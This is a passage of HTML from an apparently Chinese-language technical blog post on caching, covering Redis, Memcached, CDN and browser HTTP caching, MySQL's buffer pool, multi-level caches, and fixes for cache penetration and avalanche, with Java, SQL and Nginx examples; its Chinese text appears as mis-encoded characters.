    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Duration</span> <span class="hljs-variable">CACHE_TTL</span> <span class="hljs-operator">=</span> Duration.ofMinutes(<span class="hljs-number">30</span>);
    
    <span class="hljs-comment">// ç¼“å­˜æŸ¥è¯¢</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProduct</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> PRODUCT_KEY_PREFIX + id;
        
        <span class="hljs-comment">// 1. å…ˆæŸ¥ç¼“å­˜</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> (Product) redisTemplate.opsForValue().get(key);
        
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> product;
        }
        
        <span class="hljs-comment">// 2. ç¼“å­˜æœªå‘½ä¸­ï¼ŒæŸ¥æ•°æ®åº“</span>
        product = productDao.findById(id);
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// 3. å†™å…¥ç¼“å­˜</span>
            redisTemplate.opsForValue().set(key, product, CACHE_TTL);
        }
        
        <span class="hljs-keyword">return</span> product;
    }
    
    <span class="hljs-comment">// ä½¿ç”¨æ›´é«˜æ•ˆçš„æ–¹å¼ï¼šç¼“å­˜ç©ºå€¼é˜²æ­¢ç¼“å­˜ç©¿é€</span>
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProductWithNullCache</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> PRODUCT_KEY_PREFIX + id;
        <span class="hljs-type">String</span> <span class="hljs-variable">nullKey</span> <span class="hljs-operator">=</span> PRODUCT_KEY_PREFIX + <span class="hljs-string">"null:"</span> + id;
        
        <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦æ˜¯ç©ºå€¼ï¼ˆé˜²ç¼“å­˜ç©¿é€ï¼‰</span>
        <span class="hljs-keyword">if</span> (Boolean.TRUE.equals(redisTemplate.hasKey(nullKey))) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> (Product) redisTemplate.opsForValue().get(key);
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> product;
        }
        
        product = productDao.findById(id);
        <span class="hljs-keyword">if</span> (product == <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// ç¼“å­˜ç©ºå€¼ï¼ŒçŸ­æ—¶é—´è¿‡æœŸ</span>
            redisTemplate.opsForValue().set(nullKey, <span class="hljs-string">""</span>, Duration.ofMinutes(<span class="hljs-number">5</span>));
            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
        }
        
        redisTemplate.opsForValue().set(key, product, CACHE_TTL);
        <span class="hljs-keyword">return</span> product;
    }
}
</code></pre>
<h3 data-id="heading-9">Redisçš„ä¸°å¯Œæ•°æ®ç»“æ„</h3>
<p>Redisä¸åªæ˜¯ç®€å•çš„Key-Valueå­˜å‚¨ï¼Œå®ƒçš„å¤šç§æ•°æ®ç»“æ„é€‚åº”ä¸åŒåœºæ™¯ï¼š</p>








































<table><thead><tr><th>æ•°æ®ç»“æ„</th><th>é€‚ç”¨åœºæ™¯</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>String</td><td>ç¼“å­˜å¯¹è±¡ã€è®¡æ•°å™¨</td><td><code>SET user:1 '{"name":"å¼ ä¸‰"}'</code></td></tr><tr><td>Hash</td><td>å­˜å‚¨å¯¹è±¡å±æ€§</td><td><code>HSET product:1001 name "æ‰‹æœº" price 2999</code></td></tr><tr><td>List</td><td>æ¶ˆæ¯é˜Ÿåˆ—ã€æœ€æ–°åˆ—è¡¨</td><td><code>LPUSH news:latest "æ–°é—»æ ‡é¢˜"</code></td></tr><tr><td>Set</td><td>æ ‡ç­¾ã€å…±åŒå¥½å‹</td><td><code>SADD user:100:tags "æ•°ç " "ç§‘æŠ€"</code></td></tr><tr><td>Sorted Set</td><td>æ’è¡Œæ¦œã€å»¶è¿Ÿé˜Ÿåˆ—</td><td><code>ZADD leaderboard 95 "ç©å®¶A"</code></td></tr><tr><td>Bitmap</td><td>ç”¨æˆ·ç­¾åˆ°ã€æ´»è·ƒç»Ÿè®¡</td><td><code>SETBIT sign:2023:10 1 1</code></td></tr></tbody></table>
<h3 data-id="heading-10">é›†ç¾¤æ¨¡å¼é€‰æ‹©</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42aa005753fc4a789c10618a7584a2f7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766458623&amp;x-signature=TCzPY7MSnNOgU46e2E%2BmJKXap%2Fo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-11">é€‚ç”¨åœºæ™¯</h3>
<ul>
<li>ä¼šè¯å­˜å‚¨ï¼ˆåˆ†å¸ƒå¼Sessionï¼‰</li>
<li>æ’è¡Œæ¦œã€è®¡æ•°å™¨</li>
<li>æ¶ˆæ¯é˜Ÿåˆ—</li>
<li>åˆ†å¸ƒå¼é”</li>
<li>çƒ­ç‚¹æ•°æ®ç¼“å­˜</li>
</ul>
<p>æœ‰äº›å°ä¼™ä¼´åœ¨å·¥ä½œä¸­ä½¿ç”¨Redisæ—¶ï¼ŒåªæŠŠå®ƒå½“ç®€å•çš„Key-Valueç”¨ï¼Œè¿™å°±åƒç”¨ç‘å£«å†›åˆ€åªå¼€ç“¶ç›–ä¸€æ ·æµªè´¹ã€‚</p>
<p><strong>æ·±å…¥ç†è§£Redisçš„æ•°æ®ç»“æ„ï¼Œèƒ½è®©ä½ çš„ç³»ç»Ÿè®¾è®¡æ›´ä¼˜é›…é«˜æ•ˆ</strong>ã€‚</p>
<h2 data-id="heading-12">04 Memcachedï¼šç®€å•é«˜æ•ˆçš„åˆ†å¸ƒå¼ç¼“å­˜</h2>
<p>åœ¨Rediså´›èµ·ä¹‹å‰ï¼ŒMemcachedæ˜¯åˆ†å¸ƒå¼ç¼“å­˜çš„é¦–é€‰ã€‚</p>
<p>è™½ç„¶ç°åœ¨Redisæ›´æµè¡Œï¼Œä½†Memcachedåœ¨æŸäº›åœºæ™¯ä¸‹ä»æœ‰å…¶ä»·å€¼ã€‚</p>
<h3 data-id="heading-13">Memcached vs Redis æ ¸å¿ƒåŒºåˆ«</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Memcached å®¢æˆ·ç«¯ç¤ºä¾‹ï¼ˆä½¿ç”¨XMemcachedï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemcachedService</span> {
    <span class="hljs-keyword">private</span> MemcachedClient memcachedClient;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-comment">// åˆ›å»ºå®¢æˆ·ç«¯</span>
        memcachedClient = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMemcachedClientBuilder</span>(
            AddrUtil.getAddresses(<span class="hljs-string">"server1:11211 server2:11211"</span>))
            .build();
    }
    
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProduct</span><span class="hljs-params">(Long id)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product_"</span> + id;
        
        <span class="hljs-comment">// ä»Memcachedè·å–</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> memcachedClient.get(key);
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> product;
        }
        
        <span class="hljs-comment">// ç¼“å­˜æœªå‘½ä¸­</span>
        product = productDao.findById(id);
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// å­˜å‚¨åˆ°Memcachedï¼Œè¿‡æœŸæ—¶é—´30åˆ†é’Ÿ</span>
            memcachedClient.set(key, <span class="hljs-number">30</span> * <span class="hljs-number">60</span>, product);
        }
        
        <span class="hljs-keyword">return</span> product;
    }
}
</code></pre>
<p><strong>ä¸¤è€…çš„æ ¸å¿ƒå·®å¼‚å¯¹æ¯”</strong>ï¼š</p>



































<table><thead><tr><th>ç‰¹æ€§</th><th>Redis</th><th>Memcached</th></tr></thead><tbody><tr><td><strong>æ•°æ®ç»“æ„</strong></td><td>ä¸°å¯Œï¼ˆStringã€Hashã€Listç­‰ï¼‰</td><td>ç®€å•ï¼ˆKey-Valueï¼‰</td></tr><tr><td><strong>æŒä¹…åŒ–</strong></td><td>æ”¯æŒï¼ˆRDB/AOFï¼‰</td><td>ä¸æ”¯æŒ</td></tr><tr><td><strong>çº¿ç¨‹æ¨¡å‹</strong></td><td>å•çº¿ç¨‹</td><td>å¤šçº¿ç¨‹</td></tr><tr><td><strong>å†…å­˜ç®¡ç†</strong></td><td>å¤šç§ç­–ç•¥ï¼Œå¯æŒä¹…åŒ–</td><td>çº¯å†…å­˜ï¼Œé‡å¯ä¸¢å¤±</td></tr><tr><td><strong>ä½¿ç”¨åœºæ™¯</strong></td><td>ç¼“å­˜+å¤šæ ·åŒ–æ•°æ®ç»“æ„</td><td>çº¯ç¼“å­˜</td></tr></tbody></table>
<h3 data-id="heading-14">ä½•æ—¶é€‰æ‹©Memcachedï¼Ÿ</h3>
<ol>
<li><strong>çº¯ç¼“å­˜åœºæ™¯</strong>ï¼šåªéœ€è¦ç®€å•çš„Key-Valueç¼“å­˜</li>
<li><strong>è¶…å¤§Valueå­˜å‚¨</strong>ï¼šMemcachedå¯¹è¶…å¤§Valueæ”¯æŒæ›´å¥½</li>
<li><strong>å¤šçº¿ç¨‹é«˜å¹¶å‘</strong>ï¼šMemcachedçš„å¤šçº¿ç¨‹æ¨¡å‹åœ¨æç«¯å¹¶å‘ä¸‹å¯èƒ½è¡¨ç°æ›´å¥½</li>
</ol>
<h2 data-id="heading-15">05 CDNç¼“å­˜ï¼šåŠ é€Ÿé™æ€èµ„æºçš„åˆ©å™¨</h2>
<p>æœ‰äº›å°ä¼™ä¼´å¯èƒ½ä¼šç–‘æƒ‘ï¼šCDNä¹Ÿç®—ç¼“å­˜å—ï¼Ÿå½“ç„¶ç®—ï¼Œè€Œä¸”æ˜¯<strong>åœ°ç†ä½ç½®æœ€è¿‘</strong>çš„ç¼“å­˜ã€‚</p>
<h3 data-id="heading-16">CDNçš„å·¥ä½œåŸç†</h3>
<p>CDNï¼ˆContent Delivery Networkï¼‰é€šè¿‡åœ¨å„åœ°éƒ¨ç½²è¾¹ç¼˜èŠ‚ç‚¹ï¼Œå°†é™æ€èµ„æºç¼“å­˜åˆ°ç¦»ç”¨æˆ·æœ€è¿‘çš„èŠ‚ç‚¹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åœ¨åº”ç”¨ä¸­ç”ŸæˆCDNé“¾æ¥</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CDNService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">cdnDomain</span> <span class="hljs-operator">=</span> <span class="hljs-string">"https://cdn.yourcompany.com"</span>;
    
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCDNUrl</span><span class="hljs-params">(String relativePath)</span> {
        <span class="hljs-comment">// æ·»åŠ ç‰ˆæœ¬å·æˆ–æ—¶é—´æˆ³ï¼Œé˜²æ­¢ç¼“å­˜æ—§ç‰ˆæœ¬</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> getFileVersion(relativePath);
        <span class="hljs-keyword">return</span> String.format(<span class="hljs-string">"%s/%s?v=%s"</span>, cdnDomain, relativePath, version);
    }
    
    <span class="hljs-comment">// ä¸Šä¼ æ–‡ä»¶åˆ°CDNçš„ç¤ºä¾‹ï¼ˆä¼ªä»£ç ï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">uploadToCDN</span><span class="hljs-params">(File file, String remotePath)</span> {
        <span class="hljs-comment">// 1. ä¸Šä¼ åˆ°æºç«™</span>
        uploadToOrigin(file, remotePath);
        
        <span class="hljs-comment">// 2. è§¦å‘CDNé¢„çƒ­ï¼ˆå°†æ–‡ä»¶ä¸»åŠ¨æ¨é€åˆ°è¾¹ç¼˜èŠ‚ç‚¹ï¼‰</span>
        preheatCDN(remotePath);
        
        <span class="hljs-comment">// 3. åˆ·æ–°æ—§ç¼“å­˜ï¼ˆå¦‚æœéœ€è¦ï¼‰</span>
        refreshCDNCache(remotePath);
    }
}
</code></pre>
<h3 data-id="heading-17">CDNç¼“å­˜ç­–ç•¥é…ç½®</h3>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-comment"># Nginxä¸­çš„CDNç¼“å­˜é…ç½®ç¤ºä¾‹</span>
location ~* \.(jpg|<span class="hljs-params">jpeg</span>|png|<span class="hljs-params">gif</span>|ico|<span class="hljs-params">css</span>|js)<span class="hljs-variable">$ </span>{
    expires 365d;  <span class="hljs-comment"># ç¼“å­˜ä¸€å¹´</span>
    add_header <span class="hljs-title class_">Cache</span>-<span class="hljs-title class_">Control</span> <span class="hljs-string">"public, immutable"</span>;
    
    <span class="hljs-comment"># æ·»åŠ ç‰ˆæœ¬å·ä½œä¸ºæŸ¥è¯¢å‚æ•°</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$query_string</span> ~* <span class="hljs-string">"^v=\d+"</span>) {
        expires max;
    }
}
</code></pre>
<h3 data-id="heading-18">é€‚ç”¨åœºæ™¯</h3>
<ul>
<li>é™æ€èµ„æºï¼šå›¾ç‰‡ã€CSSã€JSæ–‡ä»¶</li>
<li>è½¯ä»¶ä¸‹è½½åŒ…</li>
<li>è§†é¢‘æµåª’ä½“</li>
<li>å…¨çƒè®¿é—®çš„ç½‘ç«™</li>
</ul>
<h2 data-id="heading-19">06 æµè§ˆå™¨ç¼“å­˜ï¼šæœ€å‰ç«¯çš„æ€§èƒ½ä¼˜åŒ–</h2>
<p>æµè§ˆå™¨ç¼“å­˜æ˜¯æœ€å®¹æ˜“è¢«å¿½è§†ä½†æ•ˆæœæœ€ç›´æ¥çš„ç¼“å­˜å±‚çº§ã€‚åˆç†åˆ©ç”¨æµè§ˆå™¨ç¼“å­˜ï¼Œå¯ä»¥å¤§å¹…å‡å°‘æœåŠ¡å™¨å‹åŠ›ã€‚</p>
<h3 data-id="heading-20">HTTPç¼“å­˜å¤´è¯¦è§£</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Spring Bootä¸­è®¾ç½®HTTPç¼“å­˜å¤´</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResourceController</span> {
    
    <span class="hljs-meta">@GetMapping("/static/{filename}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Resource&gt; <span class="hljs-title function_">getStaticFile</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String filename)</span> {
        <span class="hljs-type">Resource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> loadResource(filename);
        
        <span class="hljs-keyword">return</span> ResponseEntity.ok()
            .cacheControl(CacheControl.maxAge(<span class="hljs-number">7</span>, TimeUnit.DAYS)) <span class="hljs-comment">// ç¼“å­˜7å¤©</span>
            .eTag(computeETag(resource)) <span class="hljs-comment">// ETagç”¨äºåå•†ç¼“å­˜</span>
            .lastModified(resource.lastModified()) <span class="hljs-comment">// æœ€åä¿®æ”¹æ—¶é—´</span>
            .body(resource);
    }
    
    <span class="hljs-meta">@GetMapping("/dynamic/data")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Object&gt; <span class="hljs-title function_">getDynamicData</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> getData();
        
        <span class="hljs-comment">// åŠ¨æ€æ•°æ®è®¾ç½®è¾ƒçŸ­ç¼“å­˜</span>
        <span class="hljs-keyword">return</span> ResponseEntity.ok()
            .cacheControl(CacheControl.maxAge(<span class="hljs-number">30</span>, TimeUnit.SECONDS)) <span class="hljs-comment">// 30ç§’</span>
            .body(data);
    }
}
</code></pre>
<h3 data-id="heading-21">æµè§ˆå™¨ç¼“å­˜çš„ä¸¤ç§ç±»å‹</h3>
<p><img alt="è½¬å­˜å¤±è´¥ï¼Œå»ºè®®ç›´æ¥ä¸Šä¼ å›¾ç‰‡æ–‡ä»¶" src="" loading="lazy"/></p>
<p>æœ€è¿‘ä¸ºäº†å¸®åŠ©å¤§å®¶æ‰¾å·¥ä½œï¼Œä¸“é—¨å»ºäº†ä¸€äº›å·¥ä½œå†…æ¨ç¾¤ï¼Œå„å¤§åŸå¸‚éƒ½æœ‰ï¼Œæ¬¢è¿å„ä½HRå’Œæ‰¾å·¥ä½œçš„å°ä¼™ä¼´è¿›ç¾¤äº¤æµï¼Œç¾¤é‡Œç›®å‰å·²ç»æ”¶é›†äº†20å¤šå®¶å¤§å‚çš„å·¥ä½œå†…æ¨å²—ä½ã€‚åŠ è‹ä¸‰çš„å¾®ä¿¡ï¼šli_su223ï¼Œå¤‡æ³¨ï¼šæ˜é‡‘+æ‰€åœ¨åŸå¸‚ï¼Œå³å¯è¿›ç¾¤ã€‚</p>
<h3 data-id="heading-22">æœ€ä½³å®è·µ</h3>
<ol>
<li><strong>é™æ€èµ„æº</strong>ï¼šè®¾ç½®é•¿æ—¶é—´ç¼“å­˜ï¼ˆå¦‚ä¸€å¹´ï¼‰ï¼Œé€šè¿‡æ–‡ä»¶åå“ˆå¸Œå¤„ç†æ›´æ–°</li>
<li><strong>åŠ¨æ€æ•°æ®</strong>ï¼šæ ¹æ®ä¸šåŠ¡éœ€æ±‚è®¾ç½®åˆç†ç¼“å­˜æ—¶é—´</li>
<li><strong>APIå“åº”</strong>ï¼šé€‚å½“ä½¿ç”¨ETagå’ŒLast-Modified</li>
</ol>
<h2 data-id="heading-23">07 æ•°æ®åº“ç¼“å­˜ï¼šå®¹æ˜“è¢«å¿½ç•¥çš„å†…éƒ¨ä¼˜åŒ–</h2>
<p>æ•°æ®åº“è‡ªèº«ä¹Ÿæœ‰ç¼“å­˜æœºåˆ¶ï¼Œç†è§£è¿™äº›æœºåˆ¶èƒ½å¸®åŠ©æˆ‘ä»¬å†™å‡ºæ›´é«˜æ•ˆçš„SQLã€‚</p>
<h3 data-id="heading-24">MySQLæŸ¥è¯¢ç¼“å­˜ï¼ˆå·²åºŸå¼ƒä½†å€¼å¾—äº†è§£ï¼‰</h3>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æŸ¥çœ‹æŸ¥è¯¢ç¼“å­˜çŠ¶æ€ï¼ˆMySQL 5.7åŠä¹‹å‰ï¼‰</span>
<span class="hljs-keyword">SHOW</span> VARIABLES <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'query_cache%'</span>;

<span class="hljs-comment">-- åœ¨8.0ä¹‹å‰ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼åˆ©ç”¨æŸ¥è¯¢ç¼“å­˜</span>
<span class="hljs-keyword">SELECT</span> SQL_CACHE <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> category_id <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
</code></pre>
<h3 data-id="heading-25">InnoDBç¼“å†²æ± ï¼ˆBuffer Poolï¼‰</h3>
<p>è¿™æ˜¯MySQLæ€§èƒ½çš„å…³é”®ï¼Œç¼“å­˜çš„æ˜¯<strong>æ•°æ®é¡µå’Œç´¢å¼•é¡µ</strong>ã€‚</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- æŸ¥çœ‹ç¼“å†²æ± çŠ¶æ€</span>
<span class="hljs-keyword">SHOW</span> ENGINE INNODB STATUS;

<span class="hljs-comment">-- é‡è¦çš„ç›‘æ§æŒ‡æ ‡</span>
<span class="hljs-comment">-- ç¼“å†²æ± å‘½ä¸­ç‡ = (1 - (innodb_buffer_pool_reads / innodb_buffer_pool_read_requests)) * 100%</span>
<span class="hljs-comment">-- å‘½ä¸­ç‡åº”å°½å¯èƒ½æ¥è¿‘100%</span>
</code></pre>
<h3 data-id="heading-26">æ•°æ®åº“çº§ç¼“å­˜æœ€ä½³å®è·µ</h3>
<ol>
<li><strong>åˆç†è®¾ç½®ç¼“å†²æ± å¤§å°</strong>ï¼šé€šå¸¸æ˜¯ç³»ç»Ÿå†…å­˜çš„50%-70%</li>
<li><strong>ä¼˜åŒ–æŸ¥è¯¢</strong>ï¼šé¿å…å…¨è¡¨æ‰«æï¼Œåˆç†ä½¿ç”¨ç´¢å¼•</li>
<li><strong>é¢„çƒ­ç¼“å­˜</strong>ï¼šé‡å¯åä¸»åŠ¨åŠ è½½çƒ­ç‚¹æ•°æ®</li>
<li><strong>ç›‘æ§å‘½ä¸­ç‡</strong>ï¼šæŒç»­ä¼˜åŒ–</li>
</ol>
<p>æœ‰äº›å°ä¼™ä¼´å¯èƒ½ä¼šè¿‡åº¦ä¾èµ–åº”ç”¨å±‚ç¼“å­˜ï¼Œè€Œå¿½ç•¥äº†æ•°æ®åº“è‡ªèº«çš„ç¼“å­˜ä¼˜åŒ–ã€‚</p>
<p><strong>æ•°æ®åº“ç¼“å­˜æ˜¯æœ€åä¸€é“é˜²çº¿ï¼Œä¼˜åŒ–å¥½å®ƒèƒ½è®©æ•´ä¸ªç³»ç»Ÿæ›´å¥å£®</strong>ã€‚</p>
<h2 data-id="heading-27">08 ç»¼åˆå¯¹æ¯”ä¸é€‰å‹æŒ‡å—</h2>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ç»™å¤§å®¶ä¸€ä¸ªé€‰å‹æŒ‡å—ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2f0dca268ce743fdb1b03c80cff84b0b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IuP5LiJ6K-05oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766458623&amp;x-signature=gM6U5qRP98tOrjybbtFLiJ83BFc%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-28">å®æˆ˜ä¸­çš„å¤šçº§ç¼“å­˜æ¶æ„</h3>
<p>åœ¨å®é™…çš„é«˜å¹¶å‘ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å¾€å¾€ä¼šé‡‡ç”¨<strong>å¤šçº§ç¼“å­˜ç­–ç•¥</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¤šçº§ç¼“å­˜ç¤ºä¾‹ï¼šæœ¬åœ°ç¼“å­˜ + Redis</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiLevelCacheService</span> {
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> RedisTemplate&lt;String, Object&gt; redisTemplate;
    
    <span class="hljs-comment">// ä¸€çº§ç¼“å­˜ï¼šæœ¬åœ°ç¼“å­˜</span>
    <span class="hljs-keyword">private</span> Cache&lt;Long, Product&gt; localCache = Caffeine.newBuilder()
        .maximumSize(<span class="hljs-number">1000</span>)
        .expireAfterWrite(<span class="hljs-number">30</span>, TimeUnit.SECONDS) <span class="hljs-comment">// æœ¬åœ°ç¼“å­˜æ—¶é—´çŸ­</span>
        .build();
    
    <span class="hljs-comment">// äºŒçº§ç¼“å­˜ï¼šRedis</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Duration</span> <span class="hljs-variable">REDIS_TTL</span> <span class="hljs-operator">=</span> Duration.ofMinutes(<span class="hljs-number">10</span>);
    
    <span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProductWithMultiCache</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-comment">// 1. æŸ¥æœ¬åœ°ç¼“å­˜</span>
        <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> localCache.getIfPresent(id);
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">return</span> product;
        }
        
        <span class="hljs-comment">// 2. æŸ¥Redis</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">redisKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product:"</span> + id;
        product = (Product) redisTemplate.opsForValue().get(redisKey);
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// å›å¡«æœ¬åœ°ç¼“å­˜</span>
            localCache.put(id, product);
            <span class="hljs-keyword">return</span> product;
        }
        
        <span class="hljs-comment">// 3. æŸ¥æ•°æ®åº“</span>
        product = productDao.findById(id);
        <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// å†™å…¥Redis</span>
            redisTemplate.opsForValue().set(redisKey, product, REDIS_TTL);
            <span class="hljs-comment">// å†™å…¥æœ¬åœ°ç¼“å­˜</span>
            localCache.put(id, product);
        }
        
        <span class="hljs-keyword">return</span> product;
    }
}
</code></pre>
<h2 data-id="heading-29">09 ç¼“å­˜å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>
<p>åœ¨ä½¿ç”¨ç¼“å­˜çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ä¸å¯é¿å…åœ°ä¼šé‡åˆ°ä¸€äº›é—®é¢˜ï¼š</p>
<h3 data-id="heading-30">1. ç¼“å­˜ç©¿é€</h3>
<p><strong>é—®é¢˜</strong>ï¼šå¤§é‡è¯·æ±‚æŸ¥è¯¢ä¸å­˜åœ¨çš„æ•°æ®ï¼Œç»•è¿‡ç¼“å­˜ç›´æ¥å‡»ç©¿æ•°æ®åº“ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç¼“å­˜ç©ºå€¼æ–¹æ¡ˆ</span>
<span class="hljs-keyword">public</span> Product <span class="hljs-title function_">getProductSafe</span><span class="hljs-params">(Long id)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product:"</span> + id;
    <span class="hljs-type">String</span> <span class="hljs-variable">nullKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">"product:null:"</span> + id;
    
    <span class="hljs-comment">// æ£€æŸ¥ç©ºå€¼æ ‡è®°</span>
    <span class="hljs-keyword">if</span> (redisTemplate.hasKey(nullKey)) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    
    <span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> (Product) redisTemplate.opsForValue().get(key);
    <span class="hljs-keyword">if</span> (product != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">return</span> product;
    }
    
    product = productDao.findById(id);
    <span class="hljs-keyword">if</span> (product == <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// ç¼“å­˜ç©ºå€¼ï¼ŒçŸ­æ—¶é—´è¿‡æœŸ</span>
        redisTemplate.opsForValue().set(nullKey, <span class="hljs-string">""</span>, Duration.ofMinutes(<span class="hljs-number">5</span>));
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
    
    redisTemplate.opsForValue().set(key, product, Duration.ofMinutes(<span class="hljs-number">30</span>));
    <span class="hljs-keyword">return</span> product;
}
</code></pre>
<h3 data-id="heading-31">2. ç¼“å­˜é›ªå´©</h3>
<p><strong>é—®é¢˜</strong>ï¼šå¤§é‡ç¼“å­˜åŒæ—¶è¿‡æœŸï¼Œè¯·æ±‚å…¨éƒ¨æ‰“åˆ°æ•°æ®åº“ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å·®å¼‚åŒ–è¿‡æœŸæ—¶é—´</span>
<span class="hljs-keyword">private</span> Duration <span class="hljs-title function_">getRandomTTL</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// åŸºç¡€30åˆ†é’Ÿ + éšæœº0-10åˆ†é’Ÿ</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">baseMinutes</span> <span class="hljs-operator">=</span> <span class="hljs-number">30</span>;
    <span class="hljs-type">long</span> <span class="hljs-variable">randomMinutes</span> <span class="hljs-operator">=</span> ThreadLocalRandom.current().nextLong(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>);
    <span class="hljs-keyword">return</span> Duration.ofMinutes(baseMinutes + randomMinutes);
}
</code></pre>
<h3 data-id="heading-32">3. ç¼“å­˜å‡»ç©¿</h3>
